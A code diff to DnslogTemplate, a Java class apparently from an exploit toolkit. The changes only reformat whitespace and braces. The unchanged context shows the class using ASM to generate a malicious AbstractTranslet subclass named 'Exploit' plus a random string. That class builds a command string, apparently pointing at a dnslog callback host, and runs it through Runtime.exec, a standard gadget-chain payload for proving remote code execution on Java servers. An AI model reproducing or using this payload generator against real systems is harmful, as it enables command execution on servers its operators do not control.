@@ -12,36 +12,36 @@ public class DnslogTemplate implements Template {
     private String dnslog;
 
 
-    public DnslogTemplate(String dnslog){
+    public DnslogTemplate(String dnslog) {
         this.dnslog = dnslog;
         this.className = "Exploit" + Util.getRandomString();
 
         generate();
     }
 
-    public DnslogTemplate(String dnslog, String className){
+    public DnslogTemplate(String dnslog, String className) {
         this.dnslog = dnslog;
         this.className = className;
 
         generate();
     }
 
-    public void cache(){
+    public void cache() {
         Cache.set(className, bytes);
     }
 
-    public String getClassName(){
+    public String getClassName() {
         return className;
     }
 
-    public byte[] getBytes(){
+    public byte[] getBytes() {
         return bytes;
     }
 
-    public void generate(){
-        ClassWriter cw = new ClassWriter(0);
-        FieldVisitor fv;
-        MethodVisitor mv;
+    public void generate() {
+        ClassWriter       cw = new ClassWriter(0);
+        FieldVisitor      fv;
+        MethodVisitor     mv;
         AnnotationVisitor av0;
 
         cw.visit(V1_6, ACC_PUBLIC + ACC_SUPER, className, null, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", null);
@@ -75,7 +75,7 @@ public class DnslogTemplate implements Template {
             mv.visitVarInsn(ASTORE, 1);
             mv.visitJumpInsn(GOTO, l0);
             mv.visitLabel(l3);
-            mv.visitFrame(Opcodes.F_FULL, 1, new Object[] {className}, 0, new Object[] {});
+            mv.visitFrame(Opcodes.F_FULL, 1, new Object[]{className}, 0, new Object[]{});
             mv.visitTypeInsn(NEW, "java/lang/StringBuilder");
             mv.visitInsn(DUP);
             mv.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
@@ -86,7 +86,7 @@ public class DnslogTemplate implements Template {
             mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
             mv.visitVarInsn(ASTORE, 1);
             mv.visitLabel(l0);
-            mv.visitFrame(Opcodes.F_APPEND,1, new Object[] {"java/lang/String"}, 0, null);
+            mv.visitFrame(Opcodes.F_APPEND, 1, new Object[]{"java/lang/String"}, 0, null);
             mv.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
             mv.visitVarInsn(ALOAD, 1);
             mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
@@ -95,7 +95,7 @@ public class DnslogTemplate implements Template {
             Label l4 = new Label();
             mv.visitJumpInsn(GOTO, l4);
             mv.visitLabel(l2);
-            mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[] {"java/io/IOException"});
+            mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[]{"java/io/IOException"});
             mv.visitVarInsn(ASTORE, 2);
             mv.visitVarInsn(ALOAD, 2);
             mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/IOException", "printStackTrace", "()V", false);
@@ -106,14 +106,14 @@ public class DnslogTemplate implements Template {
             mv.visitEnd();
         }
         {
-            mv = cw.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[] { "com/sun/org/apache/xalan/internal/xsltc/TransletException" });
+            mv = cw.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
             mv.visitCode();
             mv.visitInsn(RETURN);
             mv.visitMaxs(0, 3);
             mv.visitEnd();
         }
         {
-            mv = cw.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[] { "com/sun/org/apache/xalan/internal/xsltc/TransletException" });
+            mv = cw.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
             mv.visitCode();
             mv.visitInsn(RETURN);
             mv.visitMaxs(0, 4);
